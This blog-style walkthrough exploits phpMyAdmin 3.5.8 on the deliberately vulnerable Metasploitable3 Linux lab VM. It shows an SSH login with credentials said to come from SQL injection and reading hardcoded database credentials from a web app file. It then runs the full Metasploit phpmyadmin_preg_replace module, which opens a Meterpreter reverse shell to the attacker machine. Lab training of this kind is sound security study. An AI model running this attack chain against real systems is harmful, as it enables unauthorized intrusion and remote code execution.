---
title: phpMyAdmin Authenticated Remote Code Execution via preg_replace() 
date: 2023-12-18
description:  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
tags: 
    - Metasploitable3 Linux Edition
categories:
    - Parrot OS
    - Metasploitable3 Linux Edition
toc: false
---

## Target: Metasploitable 3 Linux

## Tool: Metasploit

## Vulnerability: phpMyAdmin Authenticated Remote Code Execution via preg_replace()

phpMyAdmin Authenticated Remote Code Execution via preg_replace()

Perform SQL Injection, login into the Metasploitable3 via SSH using the stolen credentials. Navigate to the var/www/html directory to locate the Apache web server documents.

```shell
┌─[parrot@parrot]─[~]
└──╼ $ssh leia_organa@10.0.2.28
leia_organa@10.0.2.28's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Mar  5 12:47:01 2024 from 10.0.2.16
leia_organa@metasploitable3-ub1404:~$ su luke_skywalker
Password: 
luke_skywalker@metasploitable3-ub1404:/home/leia_organa$ cd ..
luke_skywalker@metasploitable3-ub1404:/home$ ls
abril             artoo_detoo  boba_fett  c_three_pio  greedo    jabba_hutt    kylo_ren          leia_organa     vagrant
anakin_skywalker  ben_kenobi   chewbacca  darth_vader  han_solo  jarjar_binks  lando_calrissian  luke_skywalker
luke_skywalker@metasploitable3-ub1404:/home$ cd ..
luke_skywalker@metasploitable3-ub1404:/$ ls
bin   dev  home        initrd.img.old  lib64       media  node_modules  proc  run   srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    opt           root  sbin  sys  usr  vmlinuz
luke_skywalker@metasploitable3-ub1404:/$ cd var/www/html
luke_skywalker@metasploitable3-ub1404:/var/www/html$ ls
6GTNp.php  chat  DCz17U.php  drupal  jnf29p.php  MbES5.php  napXB.php  payroll_app.php  phpmyadmin
luke_skywalker@metasploitable3-ub1404:/var/www/html$ nano payroll_app.php
```

Open the payroll_app.php and explore the file to retrieve login credentials.

```php
$conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');
```

Username: root

Password: sploitme

 ```shell
 [msf](Jobs:0 Agents:0) >> search phpMyAdmin Authenticated Remote Code Execution

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   1  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
   2  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
   3  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/phpmyadmin_preg_replace

[msf](Jobs:0 Agents:0) >> use 3
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> show options

Module options (exploit/multi/http/phpmyadmin_preg_replace):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
                                         oit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set RHOST 10.0.2.28
RHOST => 10.0.2.28
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set LHOST 10.0.2.16
LHOST => 10.0.2.16
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set PASSWORD sploitme
PASSWORD => sploitme
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> run

[*] Started reverse TCP handler on 10.0.2.16:4444 
[*] phpMyAdmin version: 3.5.8
[*] The target appears to be vulnerable.
[*] Grabbing CSRF token...
[+] Retrieved token
[*] Authenticating...
[+] Authentication successful
[*] Sending stage (39927 bytes) to 10.0.2.28
[*] Meterpreter session 1 opened (10.0.2.16:4444 -> 10.0.2.28:33549) at 2024-03-05 13:41:26 +0000

(Meterpreter 1)(/var/www/html/phpmyadmin) > pwd
/var/www/html/phpmyadmin
(Meterpreter 1)(/var/www/html/phpmyadmin) > getuid
Server username: www-data

 ```
